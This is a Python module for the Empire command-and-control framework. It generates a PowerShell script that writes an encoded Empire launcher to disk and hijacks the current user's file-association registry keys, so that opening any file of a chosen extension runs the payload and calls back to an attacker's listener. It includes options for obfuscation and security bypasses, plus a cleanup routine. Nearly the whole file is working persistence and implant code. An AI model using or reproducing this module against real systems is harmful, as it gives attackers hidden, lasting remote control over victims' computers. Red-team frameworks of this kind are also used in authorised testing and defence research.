from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule

_BACKUP_KEY = "HKCU:\\Software\\Empire\\FileAssocBackup"


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        listener_name = params["Listener"]
        language = params["Language"]
        extension = params["Extension"]
        script_path = params["ScriptPath"]
        cleanup = params["Cleanup"]
        obf = params["Obfuscate"].lower() == "true"
        obf_cmd = params["ObfuscateCommand"]
        bypasses = params["Bypasses"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        if not extension.startswith("."):
            raise ModuleValidationException(
                f"Extension must start with a dot, got: {extension}"
            )
        ext_clean = extension.lstrip(".")
        handler_name = "EmpireHandler" + ext_clean

        if cleanup.lower() == "true":
            script = (
                "$scriptFile = $ExecutionContext.InvokeCommand.ExpandString('"
                + script_path
                + "');\n"
                "$backupKey = '" + _BACKUP_KEY + "';\n"
                "$extKey = 'HKCU:\\Software\\Classes\\" + extension + "';\n"
                "$handlerKey = 'HKCU:\\Software\\Classes\\" + handler_name + "';\n"
                "Remove-Item -Path $scriptFile -Force -ErrorAction SilentlyContinue;\n"
                # Delete the handler class we created
                "try {\n"
                "    if (Test-Path $handlerKey) {\n"
                "        Remove-Item -Path $handlerKey -Recurse -Force -ErrorAction Stop;\n"
                '        Write-Output "[+] Removed handler class: $handlerKey";\n'
                "    }\n"
                "} catch {\n"
                '    Write-Output "[-] Failed to remove $handlerKey`: $_";\n'
                "}\n"
                # Restore the extension key
                "if (Test-Path $backupKey) {\n"
                "    $backup = Get-ItemProperty -Path $backupKey -ErrorAction SilentlyContinue;\n"
                "    if ($backup -and ($backup.PSObject.Properties.Name -contains 'OriginalHandler')) {\n"
                "        if (-not (Test-Path $extKey)) { New-Item -Path $extKey -Force | Out-Null };\n"
                "        Set-ItemProperty -Path $extKey -Name '(Default)' -Value $backup.OriginalHandler;\n"
                '        Write-Output "[+] Restored HKCU '
                + extension
                + ' -> $($backup.OriginalHandler)";\n'
                "    } else {\n"
                "        try {\n"
                "            if (Test-Path $extKey) { Remove-Item -Path $extKey -Recurse -Force -ErrorAction Stop };\n"
                '            Write-Output "[+] Removed HKCU override for '
                + extension
                + '";\n'
                "        } catch {\n"
                '            Write-Output "[-] Failed to remove $extKey`: $_";\n'
                "        }\n"
                "    }\n"
                "    Remove-Item -Path $backupKey -Recurse -Force -ErrorAction SilentlyContinue;\n"
                "} else {\n"
                "    try {\n"
                "        if (Test-Path $extKey) { Remove-Item -Path $extKey -Recurse -Force -ErrorAction Stop };\n"
                "        Write-Output '[!] No backup found; removed HKCU override anyway.';\n"
                "    } catch {\n"
                '        Write-Output "[-] Failed to remove $extKey`: $_";\n'
                "    }\n"
                "}\n"
                "Write-Output '[+] File association persistence removed.'"
            )

            return main_menu.modulesv2.finalize_module(
                script=script,
                script_end="",
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
            )

        if not listener_name:
            raise ModuleValidationException("Listener is required.")

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        lang = language.lower()
        try:
            if lang == "powershell":
                launcher = main_menu.stagergenv2.generate_launcher(
                    listener_name=listener_name,
                    language="powershell",
                    encode=True,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    user_agent=user_agent,
                    proxy=proxy,
                    proxy_creds=proxy_creds,
                    bypasses=bypasses,
                )
            elif lang in ("csharp", "ironpython"):
                launcher = main_menu.stagergenv2.generate_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            elif lang == "go":
                launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            else:
                raise ModuleValidationException(f"Language '{language}' not supported.")
        except ModuleValidationException:
            raise
        except Exception as e:
            raise ModuleValidationException(
                f"[!] Launcher generation failed for {language}: {e}"
            ) from e

        if not launcher or not launcher.strip():
            raise ModuleValidationException("[!] Error in launcher command generation.")

        script = (
            "$scriptFile = $ExecutionContext.InvokeCommand.ExpandString('"
            + script_path
            + "');\n"
            "try {\n"
            "    [System.IO.File]::WriteAllText($scriptFile, '"
            + launcher.replace("'", "''")
            + "');\n"
            "} catch {\n"
            '    Write-Output "[-] Failed to write launcher: $_"; return;\n'
            "}\n"
            'Write-Output "[+] Wrote launcher to: $scriptFile";\n'
            "$backupKey = '" + _BACKUP_KEY + "';\n"
            "$extKey = 'HKCU:\\Software\\Classes\\" + extension + "';\n"
            "$handlerName = '" + handler_name + "';\n"
            '$handlerKey = "HKCU:\\Software\\Classes\\$handlerName";\n'
            '$shellKey = "$handlerKey\\shell\\open\\command";\n'
            # Back up existing HKCU override if any
            "New-Item -Path $backupKey -Force | Out-Null;\n"
            "if (Test-Path $extKey) {\n"
            "    $existing = (Get-ItemProperty -Path $extKey -Name '(Default)' -ErrorAction SilentlyContinue).'(default)';\n"
            "    if ($existing) {\n"
            "        Set-ItemProperty -Path $backupKey -Name 'OriginalHandler' -Value $existing;\n"
            '        Write-Output "[*] Backed up existing HKCU handler: $existing";\n'
            "    }\n"
            "};\n"
            # Create handler class: HKCU:\Software\Classes\EmpireHandler<ext>\shell\open\command\(Default) = cmd /c <script>
            "try {\n"
            "    New-Item -Path $shellKey -Force -ErrorAction Stop | Out-Null;\n"
            "    $commandValue = 'cmd.exe /c \"' + $scriptFile + '\"';\n"
            "    Set-ItemProperty -Path $shellKey -Name '(Default)' -Value $commandValue -ErrorAction Stop;\n"
            "} catch {\n"
            '    Write-Output "[-] Failed to create handler command: $_"; return;\n'
            "};\n"
            # Verify the command value; on mismatch, tear down the partial handler class
            "$verifyCmd = (Get-ItemProperty -Path $shellKey -Name '(Default)').'(default)';\n"
            "if ($verifyCmd -ne $commandValue) {\n"
            '    Write-Output "[-] Handler command verification failed: $verifyCmd";\n'
            "    Remove-Item -Path $handlerKey -Recurse -Force -ErrorAction SilentlyContinue;\n"
            "    return;\n"
            "};\n"
            # Point the extension at our handler
            "try {\n"
            "    New-Item -Path $extKey -Force -ErrorAction Stop | Out-Null;\n"
            "    Set-ItemProperty -Path $extKey -Name '(Default)' -Value $handlerName -ErrorAction Stop;\n"
            "} catch {\n"
            '    Write-Output "[-] Failed to set extension handler: $_";\n'
            "    Remove-Item -Path $handlerKey -Recurse -Force -ErrorAction SilentlyContinue;\n"
            "    return;\n"
            "};\n"
            "$verifyExt = (Get-ItemProperty -Path $extKey -Name '(Default)').'(default)';\n"
            "if ($verifyExt -ne $handlerName) {\n"
            '    Write-Output "[-] Extension handler verification failed: $verifyExt";\n'
            # Roll back both keys we just created
            "    Remove-Item -Path $handlerKey -Recurse -Force -ErrorAction SilentlyContinue;\n"
            "    Remove-Item -Path $extKey -Recurse -Force -ErrorAction SilentlyContinue;\n"
            "    return;\n"
            "};\n"
            "Write-Output '[+] Changed HKCU default handler for "
            + extension
            + " to Empire launcher.';\n"
            "Write-Output '[*] Opening a "
            + extension
            + " file will now execute the Empire payload.'"
        )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
